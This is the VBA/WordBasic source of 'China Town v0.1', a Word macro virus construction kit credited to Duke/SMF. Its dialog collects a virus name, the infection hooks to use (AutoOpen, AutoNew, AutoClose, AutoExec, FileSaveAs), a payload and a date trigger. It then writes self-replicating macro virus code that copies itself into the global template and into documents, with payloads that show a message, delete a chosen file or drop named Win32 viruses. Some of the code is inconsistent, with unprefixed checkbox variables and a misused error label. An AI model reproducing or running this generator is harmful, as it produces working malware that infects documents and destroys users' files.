Attribute VB_Name = "AutoOpen"

Public Sub MAIN()
Dim T$
Dim CheckBox1
Dim CheckBox2
Dim CheckBox3
Dim CheckBox4
WordBasic.MsgBox "China Town v0.1 MWVCK" + Chr(13) + Chr(13) + _
"       (c) by Duke/SMF", "China Town v0.1"
WordBasic.BeginDialog 520, 300, "China Town v0.1 MWVCK  " + _
" (c) by Duke/SMF"
'----------
WordBasic.GroupBox 10, 10, 300, 110, " Virus info : "
WordBasic.Text 20, 30, 100, 17, "Author:"
WordBasic.TextBox 120, 30, 180, 17, "Author$"
WordBasic.Text 20, 50, 100, 17, "Virus name:"
WordBasic.TextBox 120, 50, 180, 17, "Name$"
WordBasic.Text 20, 70, 100, 17, "Identifier:"
WordBasic.TextBox 120, 70, 180, 17, "Ident$"
WordBasic.Text 20, 90, 100, 17, "Target file:"
WordBasic.TextBox 120, 90, 180, 17, "File$"
'---------
WordBasic.GroupBox 320, 10, 190, 110, " Infected macros : "
WordBasic.CheckBox 330, 30, 100, 17, "AutoNew", "CheckBox1"
WordBasic.CheckBox 330, 50, 100, 17, "AutoClose", "CheckBox2"
WordBasic.CheckBox 330, 70, 100, 17, "AutoExec", "CheckBox3"
WordBasic.CheckBox 330, 90, 100, 17, "FileSaveAs", "CheckBox4"
'---------
WordBasic.GroupBox 10, 130, 300, 140, " Payload : "
WordBasic.OptionGroup "selector"
  WordBasic.OptionButton 20, 150, 100, 17, "No payload"
  WordBasic.OptionButton 20, 170, 100, 17, "Message"
  WordBasic.OptionButton 20, 190, 100, 17, "Kill file"
  WordBasic.OptionButton 20, 210, 280, 17, "Virus " + _
  "Win32.Emotion by TechnoPunk/TI "
  WordBasic.OptionButton 20, 230, 280, 17, "Virus " + _
  "Win32.Maya by Shaitan/SLAM"
  WordBasic.OptionButton 20, 250, 280, 17, "Virus " + _
  "Win32.Drol by Lord Julus"
WordBasic.TextBox 120, 170, 180, 17, "Message$"
WordBasic.TextBox 120, 190, 180, 17, "Kill$"
'----------
WordBasic.GroupBox 320, 130, 190, 140, " Time of payload : "
WordBasic.CheckBox 330, 150, 150, 17, "Year", "TwoBox1"
WordBasic.TextBox 460, 150, 30, 17, "Year$"
WordBasic.CheckBox 330, 170, 150, 17, "Month (1-12)", "TwoBox2"
WordBasic.TextBox 460, 170, 30, 17, "Month$"
WordBasic.CheckBox 330, 190, 150, 17, "Weekday (1-7)", "TwoBox3"
WordBasic.TextBox 460, 190, 30, 17, "Weekday$"
WordBasic.CheckBox 330, 210, 150, 17, "Day (1-31)", "TwoBox4"
WordBasic.TextBox 460, 210, 30, 17, "Day$"
WordBasic.CheckBox 330, 230, 150, 17, "Hour (0-23)", "TwoBox5"
WordBasic.TextBox 460, 230, 30, 17, "Hour$"
WordBasic.CheckBox 330, 250, 150, 17, "Second (0-59)", "TwoBox6"
WordBasic.TextBox 460, 250, 30, 17, "Second$"
'----------
WordBasic.OKButton 100, 275, 90, 20
WordBasic.CancelButton 320, 275, 90, 20
WordBasic.EndDialog
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
dlg.Author$ = "Duke/SMF"
dlg.Name$ = "Force of Malware"
dlg.Ident$ = "SMF"
dlg.File$ = "c:\macro.bas"
On Error GoTo -1: On Error GoTo Clo
WordBasic.Dialog.UserDialog dlg
T$ = Chr(13) + Chr(10)
'----- ???????? ????????? ???????? ??? ???? !!!
If dlg.TwoBox2 = 1 Then
    If (WordBasic.Val(dlg.Month$) < 1) Or (WordBasic.Val(dlg.Month$) > 12) Then
    Goto Err.Number
    End If
End If
If dlg.TwoBox3 = 1 Then
    If (WordBasic.Val(dlg.Weekday$) < 1) Or (WordBasic.Val(dlg.Weekday$) > 7) Then
    Goto Err.Number
    End If
End If
If dlg.TwoBox4 = 1 Then
    If (WordBasic.Val(dlg.Day$) < 1) Or (WordBasic.Val(dlg.Day$) > 31) Then
    Goto Err.Number
    End If
End If
If dlg.TwoBox5 = 1 Then
    If (WordBasic.Val(dlg.Hour$) < 0) Or (WordBasic.Val(dlg.Hour$) > 23) Then
    Goto Err.Number
    End If
End If
If dlg.TwoBox6 = 1 Then
    If (WordBasic.Val(dlg.Second$) < 0) Or (WordBasic.Val(dlg.Second$) > 59) Then
    Goto Err.Number
    End If
End If
GoTo Creator

Err.Number:
WordBasic.MsgBox "Error in time of payload !", "China Town v0.1", 16
GoTo Clo

Creator:
WordBasic.FileNew
WordBasic.Insert "'======================================================" + T$
WordBasic.Insert "'" + Chr(34) + dlg.Name$ + Chr(34) + " virus by " + _
dlg.Author$ + T$
WordBasic.Insert "'Created with China Town v0.1 MWVCK by Duke/SMF" + T$
WordBasic.Insert "'======================================================" + T$

WordBasic.Insert "'=== begin of macros AutoOpen" + T$
WordBasic.Insert "Sub MAIN" + T$
WordBasic.Insert "On Error Goto QuitO" + T$
WordBasic.Insert "infected = 0" + T$
WordBasic.Insert "For i = 1 To CountMacros(0, 0)" + T$
WordBasic.Insert Chr(9) + "If MacroName$(i, 0, 0) = " + Chr(34) + _
dlg.Ident$ + Chr(34) + " Then" + T$
WordBasic.Insert Chr(9) + Chr(9) + "infected = - 1" + T$
WordBasic.Insert Chr(9) + "End If" + T$
WordBasic.Insert "Next i" + T$
WordBasic.Insert "If infected = 0 Then" + T$
WordBasic.Insert Chr(9) + "FN$ = FileName$()" + T$
WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoOpen" + _
Chr(34) + ", " + Chr(34) + "Global:AutoOpen" + Chr(34) + T$
WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":" + _
dlg.Ident$ + Chr(34) + ", " + Chr(34) + "Global:" + _
dlg.Ident$ + Chr(34) + T$
If CheckBox1 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoNew" + _
    Chr(34) + ", " + Chr(34) + "Global:AutoNew" + Chr(34) + T$
End If
If CheckBox2 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoClose" + _
    Chr(34) + ", " + Chr(34) + "Global:AutoClose" + Chr(34) + T$
End If
If CheckBox3 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + ":AutoExec" + _
    Chr(34) + ", " + Chr(34) + "Global:AutoExec" + Chr(34) + T$
End If
If CheckBox4 = 1 Then
    WordBasic.Insert Chr(9) + "MacroCopy FN$ + " + Chr(34) + _
    ":FileSaveAs" + Chr(34) + ", " + Chr(34) + _
    "Global:FileSaveAs" + Chr(34) + T$
End If
WordBasic.Insert "End If" + T$
WordBasic.Insert "QuitO:" + T$
WordBasic.Insert "End Sub" + T$
WordBasic.Insert "'=== end of macros AutoOpen" + T$

If dlg.CheckBox1 = 1 Then
    WordBasic.Insert "'=== begin of macros AutoNew" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "On Error Goto QuitN" + T$
    WordBasic.Insert T$
    WordBasic.Insert "Infected = 0" + T$
    WordBasic.Insert "For i = 1 To CountMacros(1, 0)" + T$
    WordBasic.Insert Chr(9) + "If MacroName$(i, 1, 1) = " + Chr(34) + _
    dlg.Ident$ + Chr(34) + " Then" + T$
    WordBasic.Insert Chr(9) + "infected = 1" + T$
    WordBasic.Insert "End If" + T$
    WordBasic.Insert "Next i" + T$
    WordBasic.Insert T$
    WordBasic.Insert "If infected = 1 Then" + T$
    WordBasic.Insert Chr(9) + "Goto QuitN" + T$
    WordBasic.Insert "Else" + T$
    WordBasic.Insert Chr(9) + "On Error Resume Next" + T$
    WordBasic.Insert Chr(9) + "FileSaveAs .Format = 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoOpen" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoOpen" + _
    Chr(34) + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:" + _
    dlg.Ident$ + Chr(34) + ", FileName$() + " + Chr(34) + ":" + _
    dlg.Ident$ + Chr(34) + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoNew" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoNew" + _
    Chr(34) + T$
    If dlg.CheckBox2 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoClose" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoClose" + Chr(34) + T$
    End If
    If dlg.CheckBox3 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoExec" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoExec" + Chr(34) + T$
    End If
    If dlg.CheckBox4 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:FileSaveAs" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":FileSaveAs" + Chr(34) + T$
    End If
    WordBasic.Insert Chr(9) + "FileSaveAll 1, 0" + T$
    WordBasic.Insert "End If" + T$
    WordBasic.Insert T$
    WordBasic.Insert "QuitN:" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros AutoNew" + T$
End If

If dlg.CheckBox2 = 1 Then
    WordBasic.Insert "'=== begin of macros AutoClose" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "On Error Goto QuitC" + T$
    WordBasic.Insert "infected = 0" + T$
    WordBasic.Insert "For i = 1 To CountMacros(1, 0)" + T$
    WordBasic.Insert Chr(9) + "If MacroName$(i, 1, 1) = " + Chr(34) + _
    dlg.Ident$ + Chr(34) + " Then" + T$
    WordBasic.Insert Chr(9) + Chr(9) + "infected = 1" + T$
    WordBasic.Insert Chr(9) + "End If" + T$
    WordBasic.Insert "Next i" + T$
    WordBasic.Insert T$
    WordBasic.Insert "If infected = 1 Then" + T$
    WordBasic.Insert Chr(9) + "Goto QuitC" + T$
    WordBasic.Insert "Else" + T$
    WordBasic.Insert Chr(9) + "On Error Resume Next" + T$
    WordBasic.Insert Chr(9) + "FileSaveAs .Format = 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:" + _
    dlg.Ident$ + Chr(34) + ",FileName$()" + Chr(43) + _
    Chr(34) + ":" + dlg.Ident$ + Chr(34) + ", 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoClose" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoClose" + _
    Chr(34) + ", 1" + T$
    WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + "Global:AutoOpen" + _
    Chr(34) + ", FileName$() + " + Chr(34) + ":AutoOpen" + _
    Chr(34) + ", 1" + T$
    If CheckBox1 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoNew" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoNew" + Chr(34) + ", 1" + T$
    End If
    If CheckBox3 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:AutoExec" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":AutoExec" + Chr(34) + ", 1" + T$
    End If
    If CheckBox4 = 1 Then
        WordBasic.Insert Chr(9) + "MacroCopy " + Chr(34) + _
        "Global:FileSaveAs" + Chr(34) + ", FileName$() + " + _
        Chr(34) + ":FileSaveAs" + Chr(34) + ", 1" + T$
    End If
    WordBasic.Insert "End If" + T$
    WordBasic.Insert T$
    WordBasic.Insert "QuitC:" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros AutoClose" + T$
End If

If CheckBox3 = 1 Then
    WordBasic.Insert "'=== begin of macros AutoExec" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "Call AutoOpen" + T$
    WordBasic.Insert "Call AutoNew" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros AutoExec" + T$
End If

If CheckBox4 = 1 Then
    WordBasic.Insert "'=== begin of macros FileSaveAs" + T$
    WordBasic.Insert "Sub MAIN" + T$
    WordBasic.Insert "Dim dlg As FileSaveAs" + T$
    WordBasic.Insert "GetCurValues dlg" + T$
    WordBasic.Insert "Dialog dlg" + T$
    WordBasic.Insert "FileSaveAs dlg" + T$
    WordBasic.Insert "End Sub" + T$
    WordBasic.Insert "'=== end of macros FileSaveAs" + T$
End If

WordBasic.Insert "'=== begin of macros " + dlg.Ident$ + T$
WordBasic.Insert T$
WordBasic.Insert "'" + Chr(34) + dlg.Name$ + Chr(34) + " virus by " + _
dlg.Author$ + T$
WordBasic.Insert "'Created with China Town v0.1 MWVCK by Duke/SMF" + T$
WordBasic.Insert T$
If dlg.selector = 0 Then
    GoTo Propusk
End If
If dlg.TwoBox1 = 1 Then
    WordBasic.Insert "if Year(Now()) = " + dlg.Year$ + " Then" + T$
End If
If dlg.TwoBox2 = 1 Then
    WordBasic.Insert "if Month(Now()) = " + dlg.Month$ + " Then" + T$
End If
If dlg.TwoBox3 = 1 Then
    WordBasic.Insert "if Weekday(Now()) = " + dlg.Weekday$ + " Then" + T$
End If
If dlg.TwoBox4 = 1 Then
    WordBasic.Insert "if Day(Now()) = " + dlg.Day$ + " Then" + T$
End If
If dlg.TwoBox5 = 1 Then
    WordBasic.Insert "if Hour(Now()) = " + dlg.Hour$ + " Then" + T$
End If
If dlg.TwoBox6 = 1 Then
    WordBasic.Insert "if Second(Now()) = " + dlg.Second$ + " Then" + T$
End If
If dlg.selector = 1 Then
   WordBasic.Insert "MsgBox " + Chr(34) + dlg.Message$ + Chr(34) + _
   ", " + Chr(34) + dlg.Ident$ + Chr(34) + T$
End If
If dlg.selector = 2 Then
   WordBasic.Insert "Kill " + Chr(34) + dlg.Kill$ + Chr(34) + T$
End If
If dlg.selector = 3 Then
    WordBasic.Call "Payload1"
End If
If dlg.selector = 4 Then
    WordBasic.Call "Payload2"
End If
If dlg.selector = 5 Then
    WordBasic.Call "Payload3"
End If
If dlg.TwoBox1 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox2 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox3 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox4 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox5 = 1 Then WordBasic.Insert "End If" + T$
If dlg.TwoBox6 = 1 Then WordBasic.Insert "End If" + T$
Propusk:
WordBasic.Insert "'=== end of macros " + dlg.Ident$ + T$
WordBasic.FileSaveAs Name:=dlg.File$, Format:=4
WordBasic.FileClose (2)
WordBasic.MsgBox "New virus created !" + Chr(13) + _
"Thanks for using China Town", "China Town v0.1"

Clo:
End Sub

